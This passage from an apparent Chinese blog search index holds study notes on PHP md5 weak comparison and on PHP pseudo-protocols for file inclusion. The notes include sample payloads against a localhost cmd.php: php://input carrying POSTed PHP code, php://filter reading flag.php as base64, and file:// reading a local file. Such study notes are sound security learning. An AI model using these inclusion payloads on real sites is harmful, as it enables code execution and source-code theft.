CSS，生成样式规则 (Style Rules)</li><li>根据 DOM 树和样式规则，生成渲染树(Render Tree)</li><li>进行布局 Layout(回流&#x2F;重排):根据生成的渲染树，得到节点的几何信息（位置，大小）</li><li>进行绘制 Painting(重绘): 根据计算和获取的信息进行整个页面的绘制</li><li>Display: 展示在页面上</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>md5弱比较漏洞</title>
      <link href="/2021/01/06/md5%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/01/06/md5%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="md5弱比较漏洞"><a href="#md5弱比较漏洞" class="headerlink" title="md5弱比较漏洞"></a>md5弱比较漏洞</h2><p>md5信息摘要算法,可以产生一串32个字符的散列值</p><p>一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：<strong>若字符串以数字开头，则取开头数字作为转换结果，若无则输出0</strong></p><p>&#x3D;&#x3D;是比较运算，它不会去检查条件式的表达式的类型,</p><p>&#x3D;&#x3D;&#x3D;是恒等，它会检查查表达式的值与类型是否相等  </p><p>在比较时,0exxx格式的值都被判断为0</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2021/01/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/01/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php 伪协议"></a>php 伪协议</h2><p><em>需要首先将 php.ini 中的 allwo_url_fopen 和 allow_url_include 设置为 On</em></p><h5 id="php-x2F-x2F-访问各个输入-x2F-输出流"><a href="#php-x2F-x2F-访问各个输入-x2F-输出流" class="headerlink" title="php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流"></a>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流</h5><ul><li><p>php:&#x2F;&#x2F;input 访问请求的原始数据的只读流<br>可以获取到 POST 的数据</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1/cmd.php?file=php://input[POST DATA] <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>php:&#x2F;&#x2F;output 只写的数据流<br>允许以 print 和 echo 一样的方式写入到输出缓冲区</p></li><li><p>php:&#x2F;&#x2F;filter 元封装器,设计用于数据流打开时的筛选过滤应用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>convert.base64-encode 就是一个过滤器,flag.php 就是要过滤的数据流.<br>转换过滤器 convert._<br>字符串过滤器 string._ 用于对字符串进行各类转换(加密,转换大小写等)</p><p><strong>语法</strong></p><ul><li>resource&#x3D;&lt;要过滤的数据流&gt; 指定要筛选过滤的数据流</li><li>read&#x3D;&lt;读链的筛选列表&gt; 设定一个或多个过滤器名称,以管道符|分隔</li><li>write&#x3D;&lt;写链的筛选列表&gt; 设定一个或多个过滤器名称,以管道符|分隔</li><li>&lt;;两个链的筛选列表&gt; 任何没有以 read&#x3D;或 write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</li></ul></li><li><p>php:&#x2F;&#x2F;fd 允许直接访问指定的文件描述符.例如 php:&#x2F;&#x2F;fd&#x2F;3 引用了文件描述符 3</p></li><li><p>php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 这是一个类似文件包装器的数据流,允许读写临时数据.m 总是把数据储存在内存中,而 t 会在内存量达到预定义的限制后(默认 2MB)存入临时文件中.临时文件位置的决定和 sys_get_temp_dir()的方式一致</p></li></ul><h5 id="file-x2F-x2F-访问本地文件系统"><a href="#file-x2F-x2F-访问本地文件系统" class="headerlink" title="file:&#x2F;&#x2F; 访问本地文件系统"></a>file:&#x2F;&#x2F; 访问本地文件系统</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
